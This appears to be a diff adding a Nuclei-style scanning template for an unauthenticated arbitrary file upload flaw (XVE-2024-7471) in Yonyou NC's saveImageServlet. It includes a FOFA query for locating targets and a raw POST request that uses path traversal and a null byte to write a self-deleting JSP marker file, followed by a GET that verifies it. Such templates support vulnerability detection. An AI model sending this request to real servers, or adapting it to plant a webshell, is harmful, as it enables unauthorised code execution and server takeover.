@@ -1,0 +1,38 @@
+id: yongyouNC-saveImageServlet-File-upload-XVE-2024-7471
+
+info:
+  name: 用友NC saveImageServlet 任意文件上传漏洞(XVE-2024-7471)
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+    用友NC saveImageServlet接口处存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/2oDpPxeoDIG0WwK3FsBKZg
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../{{username}}.jsp%00 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/octet-stream
+
+        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      - |
+        GET /portal/processxml/{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
